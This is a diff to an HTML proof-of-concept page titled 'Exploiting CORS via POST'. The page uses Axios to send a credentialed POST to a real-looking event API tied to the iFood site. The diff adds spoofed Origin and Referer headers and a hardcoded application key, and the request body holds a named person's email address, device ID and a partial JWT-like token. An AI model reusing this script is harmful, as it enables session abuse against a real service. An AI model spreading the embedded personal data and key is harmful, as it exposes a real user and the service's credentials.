@@ -1,22 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Exploit PoC with Axios</title>
+  <title>CORS PoC with Axios (Postman-style)</title>
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
 <body>
-  <h2>🔥 Exploiting CORS via Axios</h2>
-  <pre id="output">Sending request...</pre>
+  <h2>🔥 Exploiting CORS via POST</h2>
+  <pre id="output">Sending...</pre>
 
   <script>
     axios({
       method: "POST",
       url: "https://api.fstr.rocks/v1/event",
-      withCredentials: true,
+      withCredentials: true, // Send cookies/session
       headers: {
-        "Content-Type": "application/json"
-        // ❌ DO NOT add "Cookie", "Origin", "User-Agent", etc.
-        // 🚫 X-Fstr-Application-Key must only be added if CORS allows it
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Accept-Language": "en-DE,en;q=0.9,de-DE;q=0.8,de;q=0.7,ar-AE;q=0.6,ar;q=0.5,en-GB;q=0.4,en-US;q=0.3",
+        "Content-Type": "application/json",
+        "Origin": "https://",  // Matches Postman spoofed origin
+        "Referer": "https://www.ifood.com.br/",
+        "X-Fstr-Application-Key": "41a266ee-51b7-4c37-9e9d-5cd331f280d5"
       },
       data: {
         deviceId: "0db8f40d-1b11-4c7b-8cfb-16f2374abb26",
@@ -27,7 +32,7 @@
             eventType: "view_web_page",
             eventTypeRevision: 0,
             dimensions: {
-              pageURL: "/entrar/otp-celular?email=amanitoama33@gmail.com",
+              pageURL: "/entrar/otp-celular?email=amanitoama33@gmail.com&token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjhlOGZj...",
               name: "amani toama",
               provider: "GOOGLE"
             },
@@ -41,8 +46,9 @@
       document.getElementById("output").textContent = "Success:\n\n" + JSON.stringify(res.data, null, 2);
     })
     .catch(err => {
-      document.getElementById("output").textContent = "Error:\n\n" + err;
+      document.getElementById("output").textContent = "Failed:\n\n" + err;
     });
   </script>
 </body>
 </html>
+
